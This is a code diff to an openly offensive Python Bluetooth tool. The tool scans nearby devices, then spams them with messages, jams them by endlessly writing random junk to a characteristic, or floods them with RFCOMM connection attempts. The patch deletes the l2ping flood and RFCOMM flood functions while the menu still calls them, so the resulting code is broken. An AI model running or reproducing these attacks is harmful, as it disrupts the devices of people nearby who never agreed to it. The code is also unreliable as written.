@@ -1,4 +1,3 @@
-# [start of script]
 import os
 import sys
 import time
@@ -29,9 +28,73 @@ class BLESpam(DefaultDelegate):
     def handleNotification(self, cHandle, data):
         print(f"🔔 Notification from BLE device: {data}")
 
+# 🔎 Interactive BLE Scanner
+def interactive_ble_scan():
+    print("🔎 Scanning for BLE devices nearby...")
+    scanner = Scanner()
+    try:
+        devices = scanner.scan(10.0)
+        if not devices:
+            print("⚠️ No BLE devices found.")
+            return []
+        for idx, dev in enumerate(devices):
+            print(f"🔹 {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
+        return devices
+    except BTLEException as e:
+        print(f"⚠️ Scan failed: {e}")
+        return []
+
+# 🔎 Classic Bluetooth Scan with Cute Output + Selection
+def scan_classic_devices():
+    print("🤖 Scanning for Classic Bluetooth devices...")
+    try:
+        output = subprocess.check_output(["hcitool", "scan"], stderr=subprocess.DEVNULL).decode()
+        lines = output.split("\n")[1:]  # Skip the first header line
+        results = []
+        for idx, line in enumerate(lines):
+            parts = line.strip().split("\t")
+            if len(parts) >= 2:
+                mac = parts[0]
+                name = parts[-1]
+                print(f"🔹 {idx}: {mac} — {name}")
+                results.append((mac, name))
+        return results
+    except Exception as e:
+        print(f"⚠️ Classic scan failed: {e}")
+        return []
+
+# 🎯 Classic RFCOMM Flood Targeted by Scan
+def classic_jam():
+    devices = scan_classic_devices()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of classic device to RFCOMM flood: "))
+        target_mac = devices[idx][0]
+    except (ValueError, IndexError):
+        print("⚠️ Invalid selection.")
+        return
+
+    print(f"💥 Starting classic RFCOMM flood on {target_mac}...")
+    for i in range(1000):
+        try:
+            subprocess.run(["rfcomm", "connect", target_mac, "1"], check=True)
+            print(f"✅ Attempt {i+1}: Connected to {target_mac}")
+        except subprocess.CalledProcessError:
+            print(f"⚠️ Attempt {i+1}: Failed to connect to {target_mac}")
+
 # 🚀 Spam Single BLE Device
 def spam_ble():
-    target_mac = input("💜 Enter target BLE MAC address: ")
+    devices = interactive_ble_scan()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of device to spam: "))
+        target_mac = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid index.")
+        return
+
     print(f"🚀 Spamming device {target_mac} 💥💜")
     custom_message = input("💜 Enter your custom spam message: ").encode()
 
@@ -58,16 +121,8 @@ def spam_ble():
 
 # 🚀 Spam All BLE Devices
 def spam_all_ble():
-    print("🔎 Scanning for BLE devices to spam 📡")
-    scanner = Scanner()
-    try:
-        devices = scanner.scan(15.0)  # ⬅️ Longer scan time
-    except BTLEException as e:
-        print(f"⚠️ Scan failed: {e}")
-        return
-
+    devices = interactive_ble_scan()
     if not devices:
-        print("⚠️ No BLE devices found.")
         return
 
     custom_message = input("💜 Enter your spam message for all devices: ").encode()
@@ -87,45 +142,40 @@ def jam_ble():
     print("🔎 Resetting BLE scan before jamming...")
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    def random_mac():
-        return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))
+    scanner = Scanner()
+    try:
+        devices = scanner.scan(15.0)
+    except BTLEException as e:
+        print(f"⚠️ BLE Scan Failed: {e}")
+        return
 
-    while True:
-        scanner = Scanner()
-        try:
-            devices = scanner.scan(15.0)
-            device_list = list(devices)
-        except BTLEException as e:
-            print(f"⚠️ BLE Scan Failed: {e}")
-            continue
+    if not devices:
+        print("⚠️ No devices found!")
+        return
 
-        if not device_list:
-            print("⚠️ No devices found!")
-            continue
+    for idx, device in enumerate(devices):
+        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
 
-        for idx, device in enumerate(device_list):
-            print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
+    try:
+        idx = int(input("💜 Enter index of device to jam: "))
+        target = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid choice.")
+        return
 
-        try:
-            idx = int(input("💜 Enter index of device to jam: "))
-            target = device_list[idx].addr
-        except (ValueError, IndexError):
-            print("⚠️ Invalid choice.")
-            continue
-
-        print(f"💥 Jamming {target} 🚫")
-        try:
-            peripheral = Peripheral(target)
-            while True:
-                junk = os.urandom(random.randint(20, 50))
-                peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
-                print(f"🚫 Jammed {target}")
-                time.sleep(random.uniform(0.05, 0.2))
-        except Exception as e:
-            print(f"⚠️ Error: {e}")
-            retry = input("💜 Try another? (y/n): ").strip().lower()
-            if retry != 'y':
-                break
+    print(f"💥 Jamming {target} 🚫")
+    try:
+        peripheral = Peripheral(target)
+        while True:
+            junk = os.urandom(random.randint(20, 50))
+            peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
+            print(f"🚫 Jammed {target}")
+            time.sleep(random.uniform(0.05, 0.2))
+    except Exception as e:
+        print(f"⚠️ Error: {e}")
+        retry = input("💜 Try another? (y/n): ").strip().lower()
+        if retry == 'y':
+            jam_ble()
 
 # 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI + CLASSIC SCAN
 def jam_all_ble():
@@ -190,37 +240,6 @@ def scan_bluetooth():
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
 
-# 💥 L2Ping Flood
-def l2ping_attack():
-    while True:
-        addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
-        if os.geteuid() != 0:
-            print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
-            return
-        print(f"💥 Sending L2Ping flood to {addr}")
-        try:
-            subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
-            print("✅ L2Ping attack successful!")
-            break
-        except subprocess.CalledProcessError:
-            print(f"⚠️ Failed. Device may be offline.")
-            if input("💜 Try another? (y/n): ").strip().lower() != 'y':
-                break
-
-# ✅ RFCOMM Flood
-def rfcomm_flood():
-    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
-    if not addr:
-        print("⚠️ No address. Exiting.")
-        return
-    print(f"💥 Starting RFCOMM flood on {addr}...")
-    for i in range(1000):
-        try:
-            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
-            print(f"✅ Attempt {i+1}: Connected")
-        except subprocess.CalledProcessError:
-            print(f"⚠️ Attempt {i+1}: Failed")
-
 # 🧠 Start Bluetooth Service
 def start_bluetooth():
     print("📡 Starting Bluetooth service...")
@@ -240,14 +259,15 @@ def main():
         print("🔹 7️⃣ Quit 🚪")
         print("🔹 8️⃣ Spam All BLE Devices 💌💥")
         print("🔹 9️⃣ Jam All BLE Devices 🚫💥")
+        print("🔹 🔟 Classic RFCOMM Jam 💣")
 
-        choice = input("💜 Choose an option (1-9): ")
-        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth, None, spam_all_ble, jam_all_ble]
+        choice = input("💜 Choose an option (1-10): ")
+        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth, None, spam_all_ble, jam_all_ble, classic_jam]
 
         if choice == "7":
             print("👋 Goodbye, fren! XOXOXO 💜")
             sys.exit()
-        elif choice in map(str, range(1, 10)):
+        elif choice in map(str, range(1, 11)):
             func = functions[int(choice)-1]
             if func:
                 func()
